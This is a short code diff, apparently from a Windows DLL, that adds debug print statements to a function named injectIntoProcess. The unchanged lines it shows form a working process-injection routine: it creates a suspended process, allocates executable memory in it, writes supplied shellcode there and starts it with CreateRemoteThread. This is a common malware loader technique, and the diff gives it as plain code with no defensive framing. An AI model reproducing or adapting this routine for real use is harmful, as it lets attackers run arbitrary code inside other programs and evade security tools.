@@ -11,6 +11,7 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
 
+    printf("CreateProcessA\n");
     if (!CreateProcessA(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
         #ifdef DEBUG
         printf("CreateProcess failed (%d).\n", GetLastError());
@@ -18,6 +19,7 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         return;
     }
 
+    printf("VirtualAllocEx\n");
     LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (remoteMemory == NULL) {
         #ifdef DEBUG
@@ -27,8 +29,9 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         return;
     }
 
+    printf("WriteProcessMemory\n");
     SIZE_T bytesWritten;
-    if (!WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, dwShellcodeSize, &bytesWritten)) {
+    if (!WriteProcessMemory(pi.hProcess, remoteMemory,shellcode, dwShellcodeSize, &bytesWritten)) {
         #ifdef DEBUG
         printf("WriteProcessMemory failed (%d).\n", GetLastError());
         #endif
@@ -37,6 +40,7 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         return;
     }
 
+    printf("CreateRemoteThread\n");
     HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
     if (hThread == NULL) {
         #ifdef DEBUG
